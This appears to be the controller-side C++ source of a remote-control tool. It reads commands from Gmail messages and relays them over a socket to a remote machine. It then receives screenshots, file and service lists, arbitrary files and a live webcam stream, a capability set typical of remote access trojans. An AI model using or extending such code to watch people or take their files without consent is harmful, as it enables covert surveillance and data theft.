// client.cpp
#include "client.h"

Client::Client(const std::string &ip_address, int port, wxStaticText *m_statusText)
    : ip_address_(ip_address), port_(port), server_socket_(INVALID_SOCKET)
{
    m_checkMessageTimer = new wxTimer(this);
    Bind(wxEVT_TIMER, [this, m_statusText](wxTimerEvent &)
         { checkForMessages(m_statusText); });
}

void Client::loadAccessToken()
{
    std::ifstream token_file("access_token.txt");
    if (token_file.is_open())
    {
        std::getline(token_file, access_token_);
        token_file.close();
    }
    else
    {
        std::cerr << "Unable to open access token file." << std::endl;
    }
}

void Client::checkForMessages(wxStaticText *m_statusText)
{
    const int interval_seconds = 3; // Polling interval
    while (true)
    {
        updateStatus("Checking for new messages...", m_statusText);

        std::vector<std::string> tasks;
        try
        {
            tasks = GmailReceiver::getUnreadMessageContents(access_token_);
        }
        catch (const std::exception &e)
        {
            // std::cerr << "Error retrieving messages: " << e.what() << std::endl;
            updateStatus("Error retrieving messages", m_statusText);
            break;
        }

        // if (tasks.empty())
        // {
        //     std::cout << "No new messages found." << std::endl;
        // }

        bool stop = false;
        for (const std::string &messageContent : tasks)
        {
            stop = processMessage(messageContent, m_statusText);
            if (stop)
            {
                break;
            }
        }

        if (stop)
        {
            break;
        }

        updateStatus("Waiting for messages...", m_statusText);
        std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
    }
}

bool Client::initialize(wxStaticText *m_statusText)
{
    if (!initializeSocket())
    {
        updateStatus("Socket initialization failed", m_statusText);
        return false;
    }

    server_socket_ = createClientSocket();
    if (server_socket_ == INVALID_SOCKET)
    {
        updateStatus("Client socket creation failed", m_statusText);
        WSACleanup();
        return false;
    }
    if (connectToServer(ip_address_.c_str(), port_))
    {
        loadAccessToken();
        checkForMessages(m_statusText);
    }
    else
    {
        updateStatus("Server connection failed", m_statusText);
        return false;
    }

    return true;
}

void Client::cleanup()
{
    if (server_socket_ != INVALID_SOCKET)
    {
        cleanupSocket();
    }
}

void Client::updateStatus(const wxString &message, wxStaticText *m_statusText)
{
    if (m_statusText)
    {
        m_statusText->SetLabel(message);
        m_statusText->GetParent()->Layout();
    }
}

void Client::startCheckingMessages(wxStaticText *m_statusText)
{
    updateStatus("Waiting for message...", m_statusText);
    m_checkMessageTimer->Start(3000);
}

void Client::stopCheckingMessages(wxStaticText *m_statusText)
{
    m_checkMessageTimer->Stop();
    updateStatus("Message checking stopped", m_statusText);
}

bool Client::processMessage(const std::string &messageContent, wxStaticText *m_statusText)
{
    updateStatus(wxString::Format("Processing: %s", messageContent), m_statusText);

    if (sendString(messageContent))
    {
        std::cout << "Sent successfully!\n";
        if (messageContent.substr(0, 8) == "list app")
        {
            receiveFile(L"apps_list.txt");
        }
        else if (messageContent.substr(0, 12) == "list service")
        {
            receiveFile(L"services_list.txt");
        }
        else if (messageContent.substr(0, 15) == "take screenshot")
        {
            receiveFile(L"screenshot.jpeg");
        }
        else if (messageContent.substr(0, 10) == "list files")
        {
            receiveFile(L"files_list.txt");
        }
        else if (messageContent.substr(0, 3) == "get")
        {
            receiveFile(L"get_file");
        }
        else if (messageContent.substr(0, 9) == "start cam")
        {
            while (true)
            {
                cv::Mat frame = receiveFrame(); // Receive frame
                if (frame.empty())
                {
                    std::cerr << "Failed to receive frame." << std::endl;
                    break;
                }

                std::cout << "Received frame of size: " << frame.size() << " and type: " << frame.type() << std::endl;

                cv::imshow("Client - Webcam Stream", frame);
                int key = cv::waitKey(1);
                if (key == 27)
                { // ESC to exit
                    // Send stop message to server
                    std::string stopMessage = "stop";
                    send(server_socket_, stopMessage.c_str(), stopMessage.size(), 0);
                    break;
                }
            }

            cv::destroyWindow("Client - Webcam Stream");
            std::cout << "Webcam stopped" << std::endl;
        }
        else if (messageContent.substr(0, 3) == "end")
        {
            return true;
        }
    }
    return false;
}

// Socket-related methods
bool Client::initializeSocket()
{
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

SOCKET Client::createClientSocket()
{
    return socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
}

bool Client::connectToServer(const char *ipAddress, int port)
{
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(ipAddress);
    serverAddress.sin_port = htons(port);

    return connect(server_socket_, (sockaddr *)&serverAddress, sizeof(serverAddress)) == 0;
}

bool Client::receiveFile(const std::wstring &filename)
{
    // First receive file size
    uint64_t fileSize = 0;
    if (recv(server_socket_, (char *)&fileSize, sizeof(fileSize), 0) <= 0)
    {
        std::cerr << "Failed to receive file size" << std::endl;
        return false;
    }

    // Validate file size
    if (fileSize > MAX_FILE_SIZE)
    {
        std::cerr << "File too large: " << fileSize << " bytes" << std::endl;
        return false;
    }

    // Open file for writing
    std::ofstream file(filename, std::ios::binary);
    if (!file)
    {
        std::cerr << "Failed to create file: " << std::endl;
        return false;
    }

    // Receive file in chunks
    std::vector<char> buffer(MAX_BUFFER_SIZE);
    uint64_t totalReceived = 0;
    int percentComplete = 0;

    while (totalReceived < fileSize)
    {
        size_t remaining = fileSize - totalReceived;
        size_t chunkSize = (remaining < MAX_BUFFER_SIZE) ? remaining : MAX_BUFFER_SIZE;

        int bytesReceived = recv(server_socket_, buffer.data(), chunkSize, 0);
        if (bytesReceived <= 0)
        {
            std::cerr << "Connection error while receiving file" << std::endl;
            file.close();
            return false;
        }

        file.write(buffer.data(), bytesReceived);
        totalReceived += bytesReceived;

        // Show progress
        int newPercent = (int)((totalReceived * 100) / fileSize);
        if (newPercent > percentComplete)
        {
            percentComplete = newPercent;
            std::cout << "\rReceiving file: " << percentComplete << "%" << std::flush;
        }
    }

    std::cout << "\nFile received successfully" << std::endl;
    file.close();
    return true;
}

void Client::cleanupSocket()
{
    closesocket(server_socket_);
    WSACleanup();
}

bool Client::sendString(const std::string &message)
{
    return send(server_socket_, message.c_str(), message.size(), 0) != SOCKET_ERROR;
}

cv::Mat Client::receiveFrame()
{
    int frameSizeNetworkOrder = 0;
    int result = recv(server_socket_, (char *)&frameSizeNetworkOrder, sizeof(frameSizeNetworkOrder), 0);
    if (result == SOCKET_ERROR || result == 0)
    {
        std::cerr << "Failed to receive frame size: " << WSAGetLastError() << std::endl;
        return cv::Mat();
    }

    int frameSize = ntohl(frameSizeNetworkOrder); // Convert from network byte order

    std::vector<uchar> buffer(frameSize);
    int receivedBytes = 0;

    while (receivedBytes < frameSize)
    {
        int chunkSize = ((MAX_PACKET_SIZE < (frameSize - receivedBytes)) ? MAX_PACKET_SIZE : (frameSize - receivedBytes));
        int bytesReceived = recv(server_socket_, (char *)buffer.data() + receivedBytes, chunkSize, 0);
        if (bytesReceived == SOCKET_ERROR)
        {
            std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
            return cv::Mat();
        }
        if (bytesReceived == 0)
        {
            std::cerr << "Connection closed by the server." << std::endl;
            return cv::Mat();
        }
        receivedBytes += bytesReceived;
    }

    // Log buffer content for debugging
    std::cout << "Received frame size: " << frameSize << std::endl;
    std::cout << "Received bytes: " << receivedBytes << std::endl;

    // Check if the buffer is filled correctly
    if (receivedBytes != frameSize)
    {
        std::cerr << "Received bytes do not match frame size." << std::endl;
        return cv::Mat();
    }

    cv::Mat frame = cv::imdecode(buffer, cv::IMREAD_COLOR);
    if (frame.empty())
    {
        std::cerr << "Failed to decode frame." << std::endl;
    }

    return frame;
}